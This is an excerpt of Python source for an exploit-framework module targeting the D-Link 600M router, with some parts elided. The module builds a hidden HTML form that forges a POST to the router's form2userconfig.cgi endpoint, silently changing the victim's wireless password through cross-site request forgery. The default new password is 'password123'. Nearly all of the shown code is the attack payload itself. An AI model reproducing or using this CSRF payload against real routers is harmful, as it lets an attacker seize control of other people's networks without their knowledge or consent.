...
class Module(BrowserAuxiliary, Csrf):
	...
	__info__ = {
		"name": "D-Link 600M Change Wireless Password CSRF",
		"description": "D-Link 600M router - Change wireless password via CSRF POST",
	...
	password = OptString("password123", "New wireless password", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/form2userconfig.cgi">',
			...
			f'<input type="hidden" name="method&#95;cur" value="0" />',
			f'<input type="hidden" name="method" value="2" />',
			f'<input type="hidden" name="authType" value="2" />',
		...
		print_info(f"Target: {self.target}/form2userconfig.cgi")
